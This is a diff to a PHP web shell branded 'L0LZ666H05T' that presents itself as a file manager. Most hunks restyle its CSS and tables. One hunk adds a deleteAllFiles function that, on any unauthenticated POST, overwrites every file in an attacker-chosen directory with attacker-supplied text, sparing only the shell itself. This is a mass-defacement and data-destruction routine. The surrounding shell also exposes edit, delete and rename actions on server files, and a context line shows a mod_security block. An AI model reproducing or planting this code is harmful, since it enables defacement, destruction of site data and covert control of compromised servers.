@@ -13,11 +13,11 @@ $title = @get_current_user();
 		border-radius:5px;
 		padding:7px;
 		box-shadow:0px 0px 10px black;
-	} tr.filemanager {
-		background:#444;
 	} select.filemanager {
 		font-family:Ubuntu Mono,serif;
 		width:100%;
+		padding:4.5px;
+		border-radius:3px;
 		background:#444;
 		border:1px solid #444;
 		color:#4C83AF;
@@ -33,6 +33,7 @@ $title = @get_current_user();
 		border:1px solid #444;
 	} textarea.filemanager {
 		width:100%;
+		border-radius:3px;
 		height:400px;
 		background:#444;
 		color:#ddd;
@@ -41,6 +42,7 @@ $title = @get_current_user();
 		box-shadow:0px 0px 5px #444;
 	} input[type=submit].filemanager {
 		background:#444;
+		border-radius:3px;
 		font-family:Ubuntu Mono,serif;
 		color:#fff;
 		font-weight:bold;
@@ -50,10 +52,12 @@ $title = @get_current_user();
 		padding:3px;
 	} div.success {
 		background:green;
+		border-radius:3px;
 		text-align:center;
 		padding:5px;
 	} div.failed {
 		background:red;
+		border-radius:3px;
 		text-align:center;
 		padding:5px;
 	} tr.hover:hover {
@@ -65,6 +69,7 @@ $title = @get_current_user();
 		cursor:pointer;
 	} input[type=text].filemanager {
 		background:#444;
+		border-radius:3px;
 		font-family:Ubuntu Mono,serif;
 		border:1px solid #444;
 		padding:5px;
@@ -79,9 +84,11 @@ $title = @get_current_user();
 		padding:7px;
 	} input[type=file] {
 		background:#444;
+		border-radius:3px;
 		font-family:Ubuntu Mono,serif;
 	} input[type=submit].file {
 		border:3px solid #444;
+		border-radius:3px;
 		font-family:Ubuntu Mono,serif;
 		width:150px;
 		background:#444;
@@ -100,6 +107,11 @@ $title = @get_current_user();
 		padding:0px 5px;
 	} a.home {
 		font-size:30px;
+	} table, tr, td {
+		padding:5px;
+		border:1px solid #303030;
+		border-collapse:collapse;
+		border-spacing:0;
 	}
 </style>
 <?php
@@ -115,7 +127,7 @@ function view($post, $filename) {
 			$arr = explode('<br />', $code); 
 			echo '<table class="high" border="0" width="100%" style="font-family: monospace;">' . "\r\n"; 
 			foreach($arr as $line) { 
-				echo '<tr>' . "\r\n"; 
+				echo '<tr style="border:none">' . "\r\n"; 
 				
 				if((strstr($line, '<span style="color: #FF8000">/*') !== false) && (strstr($line, '*/') !== false)) {
 					$comments = false;
@@ -137,9 +149,9 @@ function view($post, $filename) {
 						$startcolor = "green"; 
 					}   
 				} if($comments)
-				echo '<td width="100%" nowrap style="color: orange;">' . $line . '</td>' . "\r\n";
+				echo '<td width="100%" nowrap style="color: orange;border:none">' . $line . '</td>' . "\r\n";
 				else
-					echo '<td width="100%" nowrap style="color: ' . $startcolor . ';">' . $line . '</td>' . "\r\n"; 
+					echo '<td width="100%" nowrap style="color: ' . $startcolor . ';border:none">' . $line . '</td>' . "\r\n"; 
 				echo '</tr>' . "\r\n"; 
 				$counter++; 
 			}   
@@ -271,7 +283,34 @@ $text = "<IfModule mod_security.c>
 				@fwrite($fp, $file);
 				@fclose($fp);
 			}
-		} function makefile($post) {
+		} function deleteAllFiles($dir, $text, $filename) {
+			$getFile = @scandir($dir);
+			foreach ($getFile as $file) {
+				if ($file != "." && $file != ".." ) {
+					$noDelete = @array(@basename(__FILE__), $filename);
+					if (in_array($file, $noDelete)) {
+						continue;
+					} 
+					$fp = @fopen($dir.DIRECTORY_SEPARATOR.$file, "w");
+					if (@fwrite($fp, $text)) {
+						?>
+						<tr>
+							<td>
+								<?php print $dir.DIRECTORY_SEPARATOR.$file ?>
+								<span class="ok">OK</span>
+							</td>
+						</tr>
+						<?php
+					}
+				}
+			}
+		}
+		if (isset($_POST['submit'])) {
+			@deleteAllFiles($_POST['dir'], $_POST['text'], $_POST['filename']);
+		}
+		?>	
+		<?php
+		function makefile($post) {
 			if (isset($_GET[$post])) {
 				$filename = $_POST['filename'];
 				?>
@@ -399,7 +438,7 @@ $text = "<IfModule mod_security.c>
 				?>
 				<form method="post">
 					<tr>
-						<th>
+						<th colspan="2">
 							Copy File
 						</th>
 					</tr>
@@ -562,7 +601,6 @@ $text = "<IfModule mod_security.c>
 				<a class="home" href="<?php print $_SERVER['SCRIPT_NAME'] ?>">FILEMANAGER</a>
 			</th>
 		</tr>
-		<tr><td></td></tr>
 		<tr>
 			<td colspan="4">
 				<center>
@@ -607,8 +645,10 @@ $text = "<IfModule mod_security.c>
 			</th>
 		</tr>
 		<?php
-		if(!is_dir(PATH)) die("Directory '".PATH."' is not exists.");
-        if(!is_readable(PATH)) die("Directory '".PATH."' not readable.");
+		if(!is_dir(PATH)) die("<tr><td colspan='4'>
+        	<center> <font color='red'>Directory '".PATH."' is not exists.</font></></td></tr>");
+        if(!is_readable(PATH)) die("<tr><td colspan='4'>
+        	<center> <font color='red'>Directory '".PATH."' not readable.</font></></td></tr>");
 		foreach (@getPath() as $dir) {
 			if (!is_dir($dir)) continue;
 			if ($dir === '.' || $dir === '..') continue;
@@ -621,7 +661,7 @@ $text = "<IfModule mod_security.c>
 				<td><center><?php print @permission($dir, @perms($dir)) ?></center></td>
 				<td><center>--</center></td>
 				<td class="action">
-					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
+					<select class="path" onclick="if (this.value) window.location=(this.value)">
 						<option value="" selected>Choose . .</option>
 						<?php print @action("delete", "file", $dir, "Delete") ?>
 						<?php print @action("rename", "file", $dir, "Rename") ?>
@@ -643,7 +683,7 @@ $text = "<IfModule mod_security.c>
 				</center></td>
 				<td><center><?php print @size($file) ?></center></td>
 				<td style="width:50px;">
-					<select class="filemanager" onclick="if (this.value) window.location=(this.value)">
+					<select class="path" onclick="if (this.value) window.location=(this.value)">
 						<option value="" selected>Choose . .</option>
 						<?php print @action("edit",   "file", $file, "Edit") ?>
 						<?php print @action("delete", "file", $file, "Delete") ?>
@@ -657,8 +697,6 @@ $text = "<IfModule mod_security.c>
 			<?php
 		}
 		?>
-		<tr><td></td></tr>
-		<tr><td></td></tr>
 		<tr>
 			<th colspan="4">
 				&copy; <?php print @date("Y") ?> - L0LZ666H05T | 
